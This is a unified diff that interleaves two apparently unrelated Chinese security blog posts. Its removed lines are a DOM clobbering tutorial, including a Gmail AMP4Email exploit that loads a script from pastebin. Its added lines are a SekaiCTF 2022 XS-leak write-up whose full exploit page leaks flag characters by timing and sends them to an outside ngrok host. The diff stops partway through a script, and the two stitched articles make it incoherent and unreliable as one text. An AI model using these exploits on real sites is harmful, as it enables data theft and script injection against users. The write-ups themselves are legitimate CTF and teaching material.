@@ -1,353 +1,273 @@
-假設現在有一個留言板，你可以輸入任意內容，但是你的輸入在 server 端會透過 [DOMPurify](https://github.com/cure53/DOMPurify) 來做處理，把任何可以執行 JavaScript 的東西給拿掉，所以 `<script></script>` 會被刪掉，`<img src=x onerror=alert(1)>` 的 `onerror` 會被拿掉，還有許多 XSS payload 都沒有辦法過關。
+而我們可以利用這個排序功能來新增一個「在 flag 前面」或是「在 flag 後面」的 note，藉此來做 xsleak。
 
-簡而言之，你沒辦法執行 JavaScript 來達成 XSS，因為這些都被過濾掉了。
+我最初的想法是構造一個 payload，像這樣：`[CHAR]<canvas height="1200px"></canvas><div id="scroll"></div>`
 
-但是因為種種因素，並不會過濾掉 HTML 標籤，所以你可以做的事情是顯示自訂的 HTML。只要沒有執行 JS，你想要插入什麼 HTML 標籤，設置什麼屬性都可以。
+重點是要做到：
 
-所以呢，你可以這樣做：
+1. 如果 [CHAR] 排在 flag 前面，那當你把 location 更新成 #scroll 的時候，沒事發生（因為 #scroll 不需要捲動就看得到）
+2. 如果 [CHAR] 排在 flag 後面，那當你把 location 更新成 #scroll 的時候，頁面就會 scroll 到指定的地方（因為需要捲動）
+
+如果可以偵測這個 scroll 的行為，再加上找到符合的高度，就能知道 [CHAR] 是排在 flag 前面還後面，就可以知道 flag 的第 n 個字元。
+
+舉例來說，如果 `SEKAI{x` 不會 scroll，而 `SEKAI{y` 會 scroll，就知道 flag 的第一個字一定是 x。
+
+但問題是我沒找到方法偵測 scroll，xsleak wiki 上有個方法需要 iframe，但這題不行。而且光是你要更新 location 就做不到了，因為前面提過的 `Cross-Origin-Opener-Policy`，會讓你對開啟的 window 完全沒控制權，連關閉都做不到：
+
+``` js
+var w = window.open('https://safelist.ctf.sekai.team/')
+setTimeout(() => {
+    w.location = 'https://safelist.ctf.sekai.team/#scroll' // not working
+    // even w.close() not working
+}, 200)
+```
+
+沒關係，我後來想到了一個別的方法。
+
+## Loading image
+
+在 xsleak 的題目中，lazy loading image 是滿常用的一招，而我想到的方法其實跟剛剛差不多，只是把 #scroll 那個元素換成 image。
+
+目標一樣是找到正確的值，我們稱做 threshold 吧，可以達成像下面這樣的行為，如果 note 在 flag 前面，圖片會載入：
+
+![note1](/img/sekaictf2022-safelist-and-connection/p2.png)
+
+如果 note 在 flag 下面，因為 lazy loading 的關係圖片不會載入：
+
+![note2](/img/sekaictf2022-safelist-and-connection/p3.png)
+
+note 的內容像是這樣：`A<br><canvas height="1850px"></canvas><br><img loading=lazy src=/?img>`
+
+這邊 1850px 是在我自己瀏覽器上面測出來的值，至於遠端 admin bot 的話可以先在 local 跑一個 headless browser 起來，然後慢慢去調整去測試，我最後找到的值是 3350px。
+
+接著，只要找到方法能偵測出圖片是否有載入，就能推測出 flag 的順序，進而一個字元一個字元 leak 出整個 flag。
+
+一般常見的方式是 cache，但這題有特別設定 `Cache-Control: no-store`，所以沒辦法用 cache。
+
+那 concurrent 的限制呢？在 HTTP 1.1 的狀況下，瀏覽器對於一個 host 同時最多只能開啟 6 個連線，所以如果我們載入很多圖片，接著在另一個頁面針對 request 計時，速度應該會慢很多，因為 connection 被 block 住。
+
+但這招我試了一下發現沒效果，雖然說我確實載入很多圖片，但另外一邊我用 fetch 來測試，connection 並沒有被 block 住。
+
+於是那時我想說這個限制應該是針對「每個頁面」，意思是說我在 a.com 頁面對 target.com 發送 request 時，確實只能同時開啟 6 個，但在 b.com 頁面又能同時 6 個，每個頁面是切開的。
+
+但儘管 connection 沒有被瀏覽器 block 住也沒關係，因為 server 還是會受到影響。
+
+## server 很忙
+
+這題的 server 是跑在 Node.js，而 Node.js 是單執行緒的，意思是它同時只能處理一個 request，其他 request 會排隊。
+
+因此在開發上我們會避免一些「同步且耗時」的工作，因為這會造成效能上的問題，例如說：
+
+``` js
+app.get('/heavy', (req, res) => {
+  const result = heavyMathCalculation()
+  res.send(result)
+})
+
+app.get('/hello', (req, res) => {
+  res.send('hello')
+})
+```
+
+當我發了一個 request 給 /heavy，再發一個給 /hello，在 `heavyMathCalculation` 跑完以前，我 /hello 都不會收到 response。
+
+雖然說在這題裡面並沒有這種耗時的工作，但如果我們發了一堆 request，那 server 還是需要時間處理，所以在 response 的時間上還是會有差。
+
+總結一下，idea 大概是這樣：
+
+1. 建立一個開頭是 CHAR 的 note
+2. 不斷利用 fetch 去偵測 response time
+3. 如果 response time 小於 threshold，代表 CHAR 在 flag 後面，所以圖片沒載入
+4. 反之，代表 CHAR 在 flag 前面，因為圖片載入了拖慢 server 速度
+5. 目標是找到滿足以下條件的 CHAR `time(CHAR)>threshold && time(CHAR+1)<threshold`
+
+底下附上兩張截圖，第一個是 `SEKAI{z` 的，fetch 的載入時間總共是 0.9 秒（30 個 request），速度相對較快代表圖片沒被載入：
+
+![req1](/img/sekaictf2022-safelist-and-connection/p4.png)
+
+這張是 `SEKAI{m` 的，載入時間是 1.7s，明顯可以看出比 z 的多很多，因此第一個字元的範圍一定在 m ~ y 當中。
+
+![req2](/img/sekaictf2022-safelist-and-connection/p5.png)
+
+只要做變化版的二分搜，就可以快速找到是哪個字元，我最後的腳本如下（跑一次可以拿到一個字元）：
+
+https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45
 
 ``` html
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
+<!--
+  The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
+  If images are loading, the request to "/" is slower, otherwise faster.
+  By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
+  We can use fetch to measure the request time.
+-->
 <body>
-  <h1>留言板</h1>
-  <div>
-    你的留言：<div id="TEST_MODE"></div>
-    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
-  </div> 
+  <button onclick="run()">start</button>
+  <form id=f action="http://localhost:1234/create" method="POST" target="_blank">
+    <input id=inp name="text" value="">
+  </form>
+
+  <form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
+    <input id=inp2 name="index" value="">
+  </form>
   <script>
-    if (window.TEST_MODE) {
-      // load test script
-      var script = document.createElement('script')
-      script.src = window.TEST_SCRIPT_SRC
-      document.body.appendChild(script)
+    let flag = 'SEKAI{'
+    const TARGET = 'https://safelist.ctf.sekai.team'
+    f.action = TARGET + '/create'
+    f2.action = TARGET + '/remove'
+
+    const sleep = ms => new Promise(r => setTimeout(r, ms))
+    const send = data => fetch('http://server.ngrok.io?d='+data)
+    const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')
+
+    // start exploit
+    let count = 0
+    setTimeout(async () => {
+      let L = 0
+      let R = charset.length - 1
+      while( (R-L)>3 ) {
+        let M = Math.floor((L + R) / 2)
+        let c = charset[M]
+        send('try_' + flag + c)
+        const found = await testChar(flag + c)
+        if (found) {
+          L = M
+        } else {
+          R = M - 1
+        }
+      }
+
+      // fallback to linear since I am not familiar with binary search lol
+      for(let i=R; i>=L; i--) {
+        let c = charset[i]
+        send('try_' + flag + c)
+        const found = await testChar(flag + c)
+        if (found) {
+          send('found: '+ flag+c)
+          flag += c
+          break
+        }
+      }
+      
+    }, 0)
+
+    async function testChar(str) {
+      return new Promise(resolve => {
+          /*
+            For 3350, you need to test it on your local to get this number.
+            The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
+            If starts with "A", the image should be loaded because it's in the threshold.
+          */
+          inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
+          f.submit()
+
+          setTimeout(() => {
+            run(str, resolve)
+          }, 500)
+      })
     }
+
+    async function run(str, resolve) {
+    // if the request is not enough, we can send more by opening more window
+      for(let i=1; i<=5;i++) {
+        window.open(TARGET)
+      }
+      
+      let t = 0
+      const round = 30
+      setTimeout(async () => {
+        for(let i=0; i<round; i++) {
+          let s = performance.now()
+          await fetch(TARGET + '/?test', {
+            mode: 'no-cors'
+          }).catch(err=>1)
+          let end = performance.now()
+          t += end - s
+          console.log(end - s)
+        }
+        const avg = t/round
+        send(str + "," + t + "," + "avg:" + avg)
+
+        /*
+          I get this threshold(1000ms) by trying multiple times on remote admin bot
+          for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
+        */
+        const isFound = (t >= 1000)
+        if (isFound) {
+          inp2.value = "0"
+        } else {
+          inp2.value = "1"
+        }
+
+        // remember to delete the post to not break our leak oracle
+        f2.submit()
+        setTimeout(() => {
+          resolve(isFound)
+        }, 200)
+      }, 200)
+    }
+    
   </script>
+
 </body>
+
 </html>
 ```
 
-根據我們上面所得到的知識，可以插入一個 id 是 TEST_MODE 的標籤 `<div id="TEST_MODE"></div>`，這樣底下 JS 的 `if (window.TEST_MODE)` 就會過關，因為 `window.TEST_MODE` 會是這個 div 元素。
+## 賽後檢討
 
-再來我們可以用 `<a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>`，來讓 `window.TEST_SCRIPT_SRC` 轉成字串之後變成我們想要的字。
+賽後看到 terjanq 的[解法](https://twitter.com/terjanq/status/1576605101514313735)，他用了 `<script>` 來做 timing，而我用 fetch，差別之處在於在它的狀況之下，`<script>`的載入被 block 了！
 
-在大多數的狀況中，只是把一個變數覆蓋成 HTML 元素是不夠的，例如說你把上面那段程式碼當中的 window.TEST_MODE 轉成字串印出來：
+底下我有錄兩個影片來表示差異：
 
-``` js
-// <div id="TEST_MODE" />
-console.log(window.TEST_MODE + '')
+1. https://www.youtube.com/watch?v=ixyMZlIcnDI 用 script
+2. https://www.youtube.com/watch?v=15CJQ9nzrxs 用 fetch
+
+可以看到在第一個狀況中，應該是「每個分頁都共用同一個限制」，意思是傳說中的「6 concurrent request」是針對目的地，而不是像我前面所認知的，每個頁面都有自己的 pool。
+
+但是在第二個狀況中，看起來又不是這樣，也是我當初比賽時會誤解的原因。問了 terjanq 他回說可能是 partition key 的差別。
+
+原本想在 Chromium 原始碼裡面找答案，發現功力太淺找不到，只找到大家都能找到的 socket pool per group: https://source.chromium.org/chromium/chromium/src/+/refs/tags/107.0.5261.1:net/socket/client_socket_pool_manager.cc;l=51
+
+``` c
+// Default to allow up to 6 connections per host. Experiment and tuning may
+// try other values (greater than 0).  Too large may cause many problems, such
+// as home routers blocking the connections!?!?  See http://crbug.com/12066.
+//
+// WebSocket connections are long-lived, and should be treated differently
+// than normal other connections. Use a limit of 255, so the limit for wss will
+// be the same as the limit for ws. Also note that Firefox uses a limit of 200.
+// See http://crbug.com/486800
+int g_max_sockets_per_group[] = {
+    6,   // NORMAL_SOCKET_POOL
+    255  // WEBSOCKET_SOCKET_POOL
+};
 ```
 
-結果會是：`[object HTMLDivElement]`。
+沒找到當我呼叫 fetch 發送 request，跟我使用 `<script>` 發送 request，差別到底在哪裡。
 
-把一個 HTML 元素轉成字串就是這樣，會變成這種形式，如果是這樣的話那基本上沒辦法利用。但幸好在 HTML 裡面有兩個元素在 toString 的時候會做特殊處理：`<base>` 跟 `<a>`：
+但我後來還是做了一些實驗，我準備了三個 host：
 
-![](/img/security/dom-clobbering/p2.png)
+A: http://exp.test:1234
+B: http://example.com
+C: http://test.ngrok.io(target)
 
-來源：[4.6.3 API for a and area elements](https://html.spec.whatwg.org/#api-for-a-and-area-elements)
+簡單來說，C 是目標，而 C 有一個 endpoint 三秒之後才會給 response，接著我分別用 AB 跟 AC 去做測試，看看不同狀況底下會發生什麼事
 
-這兩個元素在 toString 的時候會回傳 URL，而我們可以透過 href 屬性來設置 URL，就可以讓 toString 之後的內容可控。
-
-所以綜合以上手法，我們學到了：
-
-1. 用 HTML 搭配 id 屬性影響 JS 變數
-2. 用 a 搭配 href 以及 id 讓元素 toString 之後變成我們想要的值
-
-透過上面這兩個手法再搭配適合的場景，就有機會利用 DOM Clobbering 來做攻擊。
-
-不過這邊要提醒大家一件事，如果你想攻擊的變數已經存在的話，你用 DOM 是覆蓋不掉的，例如說：
+程式碼大概長這樣：
 
 ``` html
-<!DOCTYPE html>
-<html>
-<head>
-  <script>
-    TEST_MODE = 1
-  </script>
-</head>
 <body>
-  <div id="TEST_MODE"></div> 
-  <script>
-    console.log(window.TEST_MODE) // 1
-  </script>
+    <button onclick=startFetch()>start fetch</button>
+    <button onclick=startScript()>start script</button>
+    <button onclick=startImg()>start img</button>
 </body>
-</html>
-```
-
-## 多層級的 DOM Clobbering
-
-在前面的範例中，我們用 DOM 把 `window.TEST_MODE` 蓋掉，創造出未預期的行為。那如果要蓋掉的對象是個物件，有機會嗎？
-
-例如說 `window.config.isTest`，這樣也可以用 DOM clobbering 蓋掉嗎？
-
-有幾種方法可以蓋掉，第一種是利用 HTML 標籤的層級關係，具有這樣特性的是 form，表單這個元素：
-
-在 HTML 的 [spec](https://www.w3.org/TR/html52/sec-forms.html) 中有這樣一段：
-
-![](/img/security/dom-clobbering/p3.png)
-
-
-可以利用 `form[name]` 或是 `form[id]` 去拿它底下的元素，例如說：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <form id="config">
-    <input name="isTest" />
-    <button id="isProd"></button>
-  </form>
-  <script>
-    console.log(config) // <form id="config">
-    console.log(config.isTest) // <input name="isTest" />
-    console.log(config.isProd) // <button id="isProd"></button>
-  </script>
-</body>
-</html>
-```
-
-如此一來就可以構造出兩層的 DOM clobbering。不過有一點要注意，那就是這邊沒有 a 可以用，所以 toString 之後都會變成沒辦法利用的形式。
-
-這邊比較有可能利用的機會是，當你要覆蓋的東西是用 `value` 存取的時候，例如說：`config.enviroment.value`，就可以利用 input 的 value 屬性做覆蓋：
-
-``` js
-<!DOCTYPE html>
-<html>
-<body>
-  <form id="config">
-    <input name="enviroment" value="test" />
-  </form>
-  <script>
-    console.log(config.enviroment.value) // test
-  </script>
-</body>
-</html>
-```
-
-簡單來說呢，就是只有那些內建的屬性可以覆蓋，其他是沒有辦法的。
-
-除了利用 HTML 本身的層級以外，還可以利用另外一個特性：HTMLCollection。
-
-在我們稍早看到的關於 `Named access on the Window object` 的 spec 當中，決定值是什麼的段落是這樣寫的：
-
-![](/img/security/dom-clobbering/p4.png)
-
-
-如果要回傳的東西有多個，就回傳 HTMLCollection。
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <a id="config"></a>
-  <a id="config"></a>
-  <script>
-    console.log(config) // HTMLCollection(2)
-  </script>
-</body>
-</html>
-```
-
-那有了 HTMLCollection 之後可以做什麼呢？在 [4.2.10.2. Interface HTMLCollection](https://dom.spec.whatwg.org/#interface-htmlcollection) 中有寫到，可以利用 name 或是 id 去拿 HTMLCollection 裡面的元素。
-
-![](/img/security/dom-clobbering/p5.png)
-
-
-像是這樣：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <a id="config"></a>
-  <a id="config" name="apiUrl" href="https://huli.tw"></a>
-  <script>
-    console.log(config.apiUrl + '')
-    // https://huli.tw
-  </script>
-</body>
-</html>
-```
-
-就可以透過同名的 id 產生出 HTMLCollection，再用 name 來抓取 HTMLCollection 的特定元素，一樣可以達到兩層的效果。
-
-而如果我們把 form 跟 HTMLCollection 結合在一起，就能夠達成三層：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <form id="config"></form>
-  <form id="config" name="prod">
-    <input name="apiUrl" value="123" />
-  </form>
-  <script>
-    console.log(config.prod.apiUrl.value) //123
-  </script>
-</body>
-</html>
-```
-
-先利用同名的 id，讓 `config` 可以拿到 HTMLCollection，再來用 `config.prod` 就可以拿到 HTMLCollection 中 name 是 prod 的元素，也就是那個 form，接著就是 `form.apiUrl` 拿到表單底下的 input，最後用 value 拿到裡面的屬性。
-
-所以如果最後要拿的屬性是 HTML 的屬性，就可以四層，否則的話就只能三層。
-
-## 再更多層級的 DOM Clobbering
-
-前面提到三層或是有條件的四層已經是極限了，那有沒有辦法再突破限制呢？
-
-根據 [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back) 裡面給的做法，有，利用 iframe 就可以達到！
-
-當你建了一個 iframe 並且給它一個 name 的時候，用這個 name 就可以指到 iframe 裡面的 window，所以可以像這樣：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <iframe name="config" srcdoc='
-    <a id="apiUrl"></a>
-  '></iframe>
-  <script>
-    setTimeout(() => {
-      console.log(config.apiUrl) // <a id="apiUrl"></a>
-    }, 500)
-  </script>
-</body>
-</html>
-```
-
-這邊之所以會需要 setTimeout 是因為 iframe 並不是同步載入的，所以需要一些時間才能正確抓到 iframe 裡面的東西。
-
-有了 iframe 的幫助之後，就可以創造出更多層級：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <iframe name="moreLevel" srcdoc='
-    <form id="config"></form>
-    <form id="config" name="prod">
-      <input name="apiUrl" value="123" />
-    </form>
-  '></iframe>
-  <script>
-    setTimeout(() => {
-      console.log(moreLevel.config.prod.apiUrl.value) //123
-    }, 500)
-  </script>
-</body>
-</html>
-```
-
-理論上你可以在 iframe 裡面再用一個 iframe，就可以達成無限多層級的 DOM clobbering，不過我試了一下發現可能有點編碼的問題需要處理，例如說像是這樣：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <iframe name="level1" srcdoc='
-    <iframe name="level2" srcdoc="
-      <iframe name="level3"></iframe>
-    "></iframe>
-  '></iframe>
-  <script>
-    setTimeout(() => {
-      console.log(level1.level2.level3) // undefined
-    }, 500)
-  </script>
-</body>
-</html>
-```
-
-印出來會是 undefined，但如果把 level3 的那兩個雙引號拿掉，直接寫成 `name=level3` 就可以成功印出東西來，我猜是因為單引號雙引號的一些解析問題造成的，目前還沒找到什麼解法，只嘗試了這樣是 ok 的，但是再往下就出錯了：
-
-``` html
-<!DOCTYPE html>
-<html>
-<body>
-  <iframe name="level1" srcdoc="
-    <iframe name=&quot;level2&quot; srcdoc=&quot;
-      <iframe name='level3' srcdoc='
-        <iframe name=level4></iframe>
-      '></iframe>
-    &quot;></iframe>
-  "></iframe>
-  <script>
-    setTimeout(() => {
-      console.log(level1.level2.level3.level4)
-    }, 500)
-  </script>
-</body>
-</html>
-```
-
-但現實生活中應該也不會到這麼深的層級啦，所以四層頂多五層就已經很夠用了。
-
-2021-08-14 補充：
-感謝朋友的告知，用這樣就可以無限多層了
-
-``` html
-<iframe name=a srcdoc="
-  <iframe name=b srcdoc=&quot
-    <iframe name=c srcdoc=&amp;quot;
-      <iframe name=d srcdoc=&amp;amp;quot;
-        <iframe name=e srcdoc=&amp;amp;amp;quot;
-          <iframe name=f srcdoc=&amp;amp;amp;amp;quot;
-            <div id=g>123</div>
-          &amp;amp;amp;amp;quot;></iframe>
-        &amp;amp;amp;quot;></iframe>
-      &amp;amp;quot;></iframe>
-    &amp;quot;></iframe>
-  &quot></iframe>
-"></iframe>
-```
-
-## 實際案例研究：Gmail AMP4Email XSS
-
-在 2019 年的時候 Gmail 有一個漏洞就是透過 DOM clobbering 來攻擊的，完整的 write up 在這邊：[XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)，底下我就稍微講一下過程（內容都取材自上面這篇文章）。
-
-簡單來說呢，在 Gmail 裡面你可以使用部分 AMP 的功能，然後 Google 針對這個格式的 validator 很嚴謹，所以沒有辦法透過一般的方法 XSS。
-
-但是有人發現可以在 HTML 元素上面設置 id，又發現當他設置了一個 `<a id="AMP_MODE">` 之後，console 突然出現一個載入 script 的錯誤，而且網址中的其中一段是 undefined。仔細去研究程式碼之後，有一段程式碼大概是這樣的：
-
-``` js
-var script = window.document.createElement("script");
-script.async = false;
-
-var loc;
-if (AMP_MODE.test && window.testLocation) {
-    loc = window.testLocation
-} else {
-    loc = window.location;
-}
-
-if (AMP_MODE.localDev) {
-    loc = loc.protocol + "//" + loc.host + "/dist"
-} else {
-    loc = "https://cdn.ampproject.org";
-}
-
-var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
-b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
-
-document.head.appendChild(b);
-```
-
-如果我們能讓 `AMP_MODE.test` 跟 `AMP_MODE.localDev` 都是 truthy 的話，再搭配設置 `window.testLocation`，就能夠載入任意的 script！
-
-所以 exploit 會長的像這樣：
-
-``` html
-// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西
-<a id="AMP_MODE" name="localDev"></a>
-<a id="AMP_MODE" name="test"></a>
-
-// 設置 testLocation.protocol
-<a id="testLocation"></a>
-<a id="testLocation" name="protocol" 
-   href="https://pastebin.com/raw/0tn8z0rG#"></a>
-```
+<script>
+    const round = 20
+    function startFetch() {
+        for(let i=0; i<20; i++){
+            fetch('http://test.ngrok.io/block?q='+i, {
+                mode: 'no-cors'
+            })
+        }
+    }
